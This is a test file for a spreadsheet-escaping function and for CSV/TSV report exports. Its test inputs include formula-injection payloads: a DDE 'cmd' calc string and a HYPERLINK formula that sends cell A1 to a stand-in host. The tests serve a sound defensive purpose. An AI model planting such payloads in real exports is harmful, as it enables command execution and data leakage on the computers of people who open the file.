import { describe, expect, it } from "vitest";
import { spreadsheetSafe, toCsv } from "@/lib/csv";
import { csvFromExportSheet, tsvFromExportSheet, type ReportExportSheet } from "@/lib/domain/report-export";

describe("spreadsheetSafe", () => {
  it("makes a value that a spreadsheet would run into text", () => {
    expect(spreadsheetSafe('=HYPERLINK("http://example.test/?"&A1,"Click")')).toBe('\'=HYPERLINK("http://example.test/?"&A1,"Click")');
    expect(spreadsheetSafe("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(spreadsheetSafe("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0");
    expect(spreadsheetSafe("@SUM(1+1)")).toBe("'@SUM(1+1)");
    expect(spreadsheetSafe("\t=1+1")).toBe("'\t=1+1");
    expect(spreadsheetSafe("\r=1+1")).toBe("'\r=1+1");
  });

  it("leaves numbers, including negative amounts, as numbers", () => {
    for (const n of ["-12.50", "-1234", "+5", "-$1,234.56", "-.5", "-12%", "0", "12000.00"]) {
      expect(spreadsheetSafe(n)).toBe(n);
    }
  });

  it("leaves ordinary text alone", () => {
    for (const s of ["Uber", "4000 Sales", "Cascade Precious Metals, Inc.", "", "a=b", "Net - 30"]) {
      expect(spreadsheetSafe(s)).toBe(s);
    }
  });
});

describe("exports run every text cell through it", () => {
  const sheet: ReportExportSheet = {
    fileName: "x",
    companyName: "=Harbour Test Co",
    title: "Vendor balances",
    subtitle: "As of June 30, 2026",
    currencyCode: "USD",
    columns: [
      { key: "vendor", header: "Vendor" },
      { key: "amount", header: "Amount", kind: "money" },
    ],
    rows: [
      { vendor: "=HYPERLINK(\"http://example.test\",\"Pay\")", amount: -125.5 },
      { vendor: "Uber", amount: 6.33 },
    ],
  };

  it("guards the CSV body and the identity rows, and keeps negative money a number", () => {
    const lines = csvFromExportSheet(sheet).split("\n");
    expect(lines[0]).toBe("'=Harbour Test Co");
    expect(lines[6]).toBe("\"'=HYPERLINK(\"\"http://example.test\"\",\"\"Pay\"\")\",-125.50");
    expect(lines[7]).toBe("Uber,6.33");
  });

  it("guards a copied table the same way", () => {
    const lines = tsvFromExportSheet(sheet).split("\n");
    expect(lines[0]).toBe("'=Harbour Test Co");
    expect(lines[6]).toBe("'=HYPERLINK(\"http://example.test\",\"Pay\")\t-125.50");
  });

  it("guards the shared CSV writer used by the audit trail and the excluded-rows file", () => {
    const csv = toCsv(
      [
        { memo: "@SUM(A1:A9)", amount: -40 },
        { memo: "Rent", amount: "-1,200.00" },
      ],
      [
        { key: "memo", header: "Memo" },
        { key: "amount", header: "Amount" },
      ],
    );
    expect(csv.split("\r\n")).toEqual(["Memo,Amount", "'@SUM(A1:A9),-40", 'Rent,"-1,200.00"']);
  });
});
